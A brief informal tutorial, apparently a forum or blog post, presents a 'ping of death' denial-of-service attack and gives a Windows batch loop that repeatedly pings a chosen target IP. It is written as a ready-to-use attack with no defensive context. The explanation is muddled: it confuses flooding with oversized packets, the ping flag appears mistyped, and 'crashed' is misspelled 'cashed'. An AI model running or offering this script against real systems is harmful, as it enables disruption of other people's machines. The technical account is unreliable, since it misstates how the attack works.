ping of death attack  is a kind of dos attack 
in which we send big amounts of packets to the target. then packets size reached 
out of capacity, then the system will be cashed.  

attack syntax is -
[write this syntax in notepad ] 
------------------------
:loop 
ping [target device ip] -1 6500 -w 1 -n 1
goto :loop
------------------------
